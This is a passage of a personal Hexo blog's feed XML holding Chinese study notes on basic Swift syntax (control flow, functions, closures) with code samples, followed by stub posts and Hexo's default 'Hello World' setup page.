class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> vegetable = <span class="string">"red pepper"</span></span><br><span class="line"><span class="keyword">switch</span> vegetable&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"celery"</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Add some raisins and make ants on a log"</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"cucumber"</span>, <span class="string">"watercress"</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"That would make a good tea sandwich."</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">let</span> x <span class="keyword">where</span> x.hasSuffix(<span class="string">"pepper"</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Is it a spicy <span class="subst">\(x)</span>?"</span>)</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Everything tastes good in soup."</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Prints "Is it a spicy red pepper?"</span></span><br></pre></td></tr></table></figure><p>实验：试着去删除掉default部分，看看会发生什么错误？</p><p>​    注意<code>let</code>可以被用于去声明一个等同于其他定值的另一个值。</p><p>​    在执行完switch对应case的代码之后，程序从switch的代码中自动退出。执行过程不会自动进入另一个case语句中，因此不需要显性地写出<code>break</code>来表明case语句的结束。</p><p>​    你可以使用for-in结构，在提供一系列变量名应用到对应的键值对的情况下，对字典内容进行重写。字典是一种无序的集合，因此他们的键值对可以用一个随意的顺序去重写。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> interestingNumbers = [</span><br><span class="line">    <span class="string">"Prime"</span>: [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line">    <span class="string">"Fibonacci"</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">    <span class="string">"Square"</span>: [<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>]</span><br><span class="line">]</span><br><span class="line"><span class="keyword">var</span> largest = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> (kind, numbers) <span class="keyword">in</span> interestingNumbers &#123;</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> numbers&#123;</span><br><span class="line">        <span class="keyword">if</span> number &gt; largest&#123;</span><br><span class="line">            largest = number</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(largest)</span><br><span class="line"><span class="comment">// Prints "25"</span></span><br></pre></td></tr></table></figure><p>实验：加入另外的变量，去判定哪一个种类的数字最大以及最大的数字是什么。</p><p>​    使用while语句去重复一个代码块，知道条件发生改变。循环的条件可以放在代码块末尾，保证这个循环至少运行一次。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> n &lt; <span class="number">100</span>&#123;</span><br><span class="line">    n *= <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="comment">// Prints "128"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m = <span class="number">2</span></span><br><span class="line"><span class="keyword">repeat</span>&#123;</span><br><span class="line">    m *= <span class="number">2</span></span><br><span class="line">&#125; <span class="keyword">while</span> m &lt; <span class="number">100</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">// Prints "128"</span></span><br></pre></td></tr></table></figure><p>​    你可以利用”..&lt;”这一符号来确定循环中参数的取值范围。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..&lt;<span class="number">4</span>&#123;</span><br><span class="line">    total += i</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(total)</span><br><span class="line"><span class="comment">//Prints "6"</span></span><br></pre></td></tr></table></figure><p>​    使用”..&lt;”来确定一个范围是，最大值被忽略，如果使用”…”则可以保证包含这些值。</p><h4 id="函数和闭包"><a href="#函数和闭包" class="headerlink" title="函数和闭包"></a>函数和闭包</h4><p>​    使用 func 关键字去声明一个函数，通过声明函数名和函数的参数来定义一个函数。使用 -&gt; 符号将函数参数的名称和种类与函数返回类型分开。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">greet</span><span class="params">(person: String, day: String)</span></span> -&gt; <span class="type">String</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello <span class="subst">\(person)</span>, today is <span class="subst">\(day)</span>."</span></span><br><span class="line">&#125;</span><br><span class="line">greet(person: <span class="string">"Bob"</span>, day: <span class="string">"Tuesday"</span>)</span><br></pre></td></tr></table></figure><p>实验：将参数 day 换成包括了午饭的问候内容。</p><p>​    在默认情况下，函数使用他们变量名作为他们声明的一个标签。在变量名之前写一个声明标签，或者使用”_”表示无标签。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">greet</span><span class="params">(<span class="number">_</span> person: String, on day: String)</span></span> -&gt; <span class="type">String</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello <span class="subst">\(person)</span>, today is <span class="subst">\(day)</span>."</span></span><br><span class="line">&#125;</span><br><span class="line">greet(<span class="string">"John"</span>, on: <span class="string">"Wednesday"</span>)</span><br></pre></td></tr></table></figure><p>​    使用数组去建立一个组合起来的值，比如说为了从一个函数中返回多个值，数组的元素可以通过名字或者参数被引用。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">calculateStatistics</span><span class="params">(scores: [Int])</span></span> -&gt; (<span class="built_in">min</span>: <span class="type">Int</span>, <span class="built_in">max</span>: <span class="type">Int</span>, sum: <span class="type">Int</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">min</span> = score[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">max</span> = score[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> score <span class="keyword">in</span> scores&#123;</span><br><span class="line">        <span class="keyword">if</span> score &gt; <span class="built_in">max</span>&#123;</span><br><span class="line">            <span class="built_in">max</span> = score</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> score &lt; <span class="built_in">min</span>&#123;</span><br><span class="line">            <span class="built_in">min</span> = score</span><br><span class="line">        &#125;</span><br><span class="line">        sum += score</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">min</span>, <span class="built_in">max</span>, sum)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> statistics = calculateStatistics(scores: [<span class="number">5</span>, <span class="number">3</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">9</span>])</span><br><span class="line"><span class="built_in">print</span>(statistics.sum)</span><br><span class="line"><span class="comment">//Prints "120"</span></span><br><span class="line"><span class="built_in">print</span>(statistics.<span class="number">2</span>)</span><br><span class="line"><span class="comment">//Prints "120"</span></span><br></pre></td></tr></table></figure><p>​    函数可以互相包含，被包含的函数可以使用在外部函数中定义的变量。你可以使用被包含的函数去简化那些长的或者复杂的代码。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">returnFifteen</span><span class="params">()</span></span> -&gt; <span class="type">Int</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> y = <span class="number">10</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">        y += <span class="number">5</span></span><br><span class="line">    &#125;</span><br><span class="line">    add()</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line">&#125;</span><br><span class="line">returnFifteen()</span><br></pre></td></tr></table></figure><p>​    函数是第一等级的种类。这就意味着函数可以使用另一个函数作为它的返回值。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">makeIncremeter</span><span class="params">()</span></span> -&gt; ((<span class="type">Int</span>) -&gt; <span class="type">Int</span>)&#123;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">addOne</span><span class="params">(number: Int)</span></span> -&gt; <span class="type">Int</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + number</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> addOne</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> increment = makeIncrementer()</span><br><span class="line">increment(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>​    函数可以使用另外一个函数来作为它的声明。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hasAnyMatches</span><span class="params">(list: [Int], condition: <span class="params">(Int)</span></span></span> -&gt; <span class="type">Bool</span>) -&gt; <span class="type">Bool</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> list&#123;</span><br><span class="line">        <span class="keyword">if</span> condition(item) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lessThanTen</span><span class="params">(number: Int)</span></span> -&gt; <span class="type">Bool</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> number &lt; <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> numbers = [<span class="number">20</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">12</span>]</span><br><span class="line">hasAnyMatches(list: numbers, condition: lessthanTen)</span><br></pre></td></tr></table></figure><p>​    函数经常作为闭包的一种特殊模式：代码块可以在之后被声明。在闭包中的代码可以调用在包被建立范围内的变量或者函数，即使闭包在程序执行的时候，不在范围内 – 你可以在相包含的函数中看到相关的例子。你可以利用 {} 符号去将闭包的代码限制起来，从而实现一个没有名字的闭包。在闭包的代码中，利用关键词 in 去分割变量声明和最后的返回部分。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">numbers.<span class="built_in">map</span>(&#123; (number: <span class="type">Int</span>) -&gt; <span class="type">Int</span> <span class="keyword">in</span></span><br><span class="line"><span class="keyword">let</span> result = <span class="number">3</span> * number</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>实验：重新写这个闭包，使其对于所有的奇数都返回0</p><p>​    你有很多种选择去更加简洁地实现你的闭包。当你的闭包的返回值的类型已经知道的时候，你可以忽略掉返回值的类型、变量的类型或者都忽略掉。简单声明的闭包隐性地返回他们声明的类型的值。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mappedNumbers = numbers.<span class="built_in">map</span>(&#123;number <span class="keyword">in</span> <span class="number">3</span> * number&#125;)</span><br><span class="line"><span class="built_in">print</span>(mappedNumbers)</span><br><span class="line"><span class="comment">//Prints "[60, 57, 21, 36]"</span></span><br></pre></td></tr></table></figure><p>​    你可以利用数字去引用变量而不是通过变量名，这个方法在小的闭包中十分好用。一个闭包作为对一个函数的最后一个变量传递的话可以在圆括号之后写。当闭包是函数唯一的变量声明的话，你可以忽略整个圆括号。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> sortedNumbers = numbers.sorted&#123; $<span class="number">0</span> &gt; $<span class="number">1</span> &#125;</span><br><span class="line"><span class="built_in">print</span>(sortedNumbers)</span><br><span class="line"><span class="comment">//Prints "[20, 19, 12, 7]"</span></span><br></pre></td></tr></table></figure><p>注：我对这块也懵，所以提供一个网址大家可以参考一下。<a href="http://www.hangge.com/blog/cache/detail_809.html" target="_blank" rel="noopener">http://www.hangge.com/blog/cache/detail_809.html</a></p><h4 id="对象和类"><a href="#对象和类" class="headerlink" title="对象和类"></a>对象和类</h4><h4 id="枚举和结构"><a href="#枚举和结构" class="headerlink" title="枚举和结构"></a>枚举和结构</h4><h4 id="协议和扩展"><a href="#协议和扩展" class="headerlink" title="协议和扩展"></a>协议和扩展</h4><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><h4 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h4><h2 id="Swift-–-基础语法"><a href="#Swift-–-基础语法" class="headerlink" title="Swift – 基础语法"></a>Swift – 基础语法</h2><h2 id="Swift-–-语言附注"><a href="#Swift-–-语言附注" class="headerlink" title="Swift – 语言附注"></a>Swift – 语言附注</h2><h2 id="历史版本及相关文献"><a href="#历史版本及相关文献" class="headerlink" title="历史版本及相关文献"></a>历史版本及相关文献</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;英语渣，QAQ。&lt;/p&gt;
&lt;p&gt;长期更新ing。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Programming Language" scheme="http://yoursite.com/tags/Programming-Language/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab2</title>
    <link href="http://yoursite.com/CSAPP-Lab2/"/>
    <id>http://yoursite.com/CSAPP-Lab2/</id>
    <published>2018-10-23T17:23:03.000Z</published>
    <updated>2018-10-23T17:24:49.323Z</updated>
    
    <content type="html"><![CDATA[<p>Ready to do it!!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Ready to do it!!&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hi,hexo</title>
    <link href="http://yoursite.com/Hi-hexo/"/>
    <id>http://yoursite.com/Hi-hexo/</id>
    <published>2018-10-23T12:16:40.000Z</published>
    <updated>2018-10-23T12:16:40.985Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/hello-world/"/>
    <id>http://yoursite.com/hello-world/</id>
    <published>2017-10-28T00:39:58.000Z</published>
    <updated>2018-11-20T16:15:07.982Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
